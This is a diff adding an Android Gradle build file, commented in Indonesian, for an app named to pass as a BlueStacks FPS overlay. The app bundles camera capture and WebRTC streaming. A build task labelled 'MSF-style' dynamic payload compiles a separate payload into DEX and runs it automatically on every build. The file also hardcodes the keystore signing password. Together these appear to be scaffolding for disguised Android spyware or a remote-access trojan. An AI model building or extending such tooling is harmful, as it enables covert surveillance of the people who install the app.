@@ -1,0 +1,175 @@
+plugins {
+    id 'com.android.application'
+    id 'com.google.gms.google-services'
+}
+
+android {
+    namespace 'com.bluestacks.fpsoverlay'
+    compileSdk 33
+    ndkVersion "27.3.13750724"
+
+    // 1. Tambahkan Konfigurasi Tanda Tangan (Signing)
+    signingConfigs {
+        release {
+            // Pastikan file my-release-key.jks berada di folder 'app'
+            storeFile file("my-release-key.jks")
+            storePassword "fradita123" // Masukkan password keystore
+            keyAlias "my-alias"
+            keyPassword "fradita123"    // Biasanya sama dengan storePassword
+        }
+    }
+
+    defaultConfig {
+        applicationId "com.bluestacks.fpsoverlay"
+        minSdk 26
+        targetSdk 33
+        
+        ndk {
+            if (project.hasProperty("targetAbi")) {
+                abiFilters project.property("targetAbi")
+            } else {
+                abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'
+            }
+        }
+
+        externalNativeBuild {
+            cmake {
+                cppFlags "-std=c++17"
+                arguments "-DANDROID_LD=lld"
+            }
+        }
+    }
+
+    buildTypes {
+        release {
+            // 2. Hubungkan tipe release dengan config signing di atas
+            signingConfig signingConfigs.release
+            
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
+
+    packaging {
+        resources {
+            excludes += '/META-INF/{AL2.0,LGPL2.1}'
+        }
+    }
+
+    externalNativeBuild {
+        cmake {
+            path "src/main/cpp/CMakeLists.txt"
+            version "3.22.1"
+        }
+    }
+}
+
+dependencies {
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'com.google.android.material:material:1.9.0'
+    implementation 'androidx.cardview:cardview:1.0.0'
+    
+    // Firebase
+    implementation platform('com.google.firebase:firebase-bom:32.2.0')
+    implementation 'com.google.firebase:firebase-database'
+
+    // Supabase & Network
+    implementation 'com.squareup.okhttp3:okhttp:4.11.0'
+    implementation 'com.google.code.gson:gson:2.10.1'
+    implementation 'org.java-websocket:Java-WebSocket:1.5.3' // For Realtime
+    
+    // CameraX
+    def camerax_version = "1.2.3"
+    implementation "androidx.camera:camera-core:${camerax_version}"
+    implementation "androidx.camera:camera-camera2:${camerax_version}"
+    implementation "androidx.camera:camera-lifecycle:${camerax_version}"
+    implementation "androidx.camera:camera-view:${camerax_version}"
+
+    // WebRTC for Realtime P2P Streaming (Ultra Stable & Optimized)
+    implementation "io.getstream:stream-webrtc-android:1.3.10"
+}
+
+// --- AUTOMATION FOR DYNAMIC PAYLOAD (MSF-STYLE) ---
+
+task buildPayloadDex {
+    group = "Payload"
+    description = "Compile payload folder to DEX format (.jar)"
+
+    doLast {
+        def sdkDir = android.sdkDirectory.getAbsolutePath()
+        def buildToolsVersion = android.buildToolsVersion
+        def payloadSrcDir = "${project.rootDir}/payload/src/main/java"
+        def outputDir = "${project.rootDir}/payload/build"
+        def outputJar = "${outputDir}/payload.jar"
+        def tempClassDir = "${project.buildDir}/intermediates/payload_classes"
+
+        // Ambil classpath dari task kompilasi Java milik app
+        def appCompileTask = tasks.findByName("compileDebugJavaWithJavac")
+        if (tasks.findByName("compileReleaseJavaWithJavac") != null && tasks.findByName("compileReleaseJavaWithJavac").enabled) {
+            appCompileTask = tasks.findByName("compileReleaseJavaWithJavac")
+        }
+
+        def classpathFiles = []
+        
+        if (appCompileTask != null) {
+            classpathFiles.addAll(appCompileTask.classpath.files.collect { it.absolutePath })
+        }
+        
+        // WAJIB: Tambahkan Android SDK jar karena tidak ada di compileClasspath standar
+        def androidJar = "${sdkDir}/platforms/android-${android.compileSdk}/android.jar"
+        classpathFiles.add(androidJar)
+        
+        // Tambahkan hasil kompilasi app (R.class, Config.class, dll)
+        def appClassesDir = "${project.buildDir}/intermediates/javac/debug/classes"
+        classpathFiles.add(appClassesDir)
+
+        def cpString = classpathFiles.join(File.pathSeparator)
+
+        new File(tempClassDir).deleteDir()
+        new File(tempClassDir).mkdirs()
+        new File(outputDir).mkdirs()
+
+        def javaFiles = fileTree(dir: payloadSrcDir, include: "**/*.java").files.collect { it.absolutePath }
+        
+        exec {
+            // Gunakan file untuk menangani classpath yang sangat panjang di Windows
+            def args = ['javac', '-cp', cpString, '-d', tempClassDir]
+            args.addAll(javaFiles)
+            commandLine args
+        }
+
+        def d8Jar = "${sdkDir}/build-tools/${buildToolsVersion}/lib/d8.jar"
+        def classFiles = fileTree(dir: tempClassDir, include: "**/*.class").files.collect { it.absolutePath }
+        
+        def d8Args = ['java', '-cp', d8Jar, 'com.android.tools.r8.D8', "--output", outputJar]
+        
+        // Tambahkan classpath sebagai --lib untuk desugaring yang benar
+        classpathFiles.each {
+            d8Args.add("--lib")
+            d8Args.add(it)
+        }
+
+        d8Args.addAll(classFiles)
+
+        exec {
+            commandLine d8Args
+        }
+
+        println "--------------------------------------------------------"
+        println "SUCCESS: Payload DEX created at: ${outputJar}"
+        println "--------------------------------------------------------"
+    }
+}
+
+// Hubungkan ke build lifecycle
+afterEvaluate {
+    if (tasks.findByName('compileDebugJavaWithJavac')) {
+        buildPayloadDex.dependsOn 'compileDebugJavaWithJavac'
+    }
+    if (tasks.findByName('compileReleaseJavaWithJavac')) {
+        buildPayloadDex.dependsOn 'compileReleaseJavaWithJavac'
+    }
+    tasks.findByName('assembleDebug')?.dependsOn buildPayloadDex
+    tasks.findByName('assembleRelease')?.dependsOn buildPayloadDex
+}
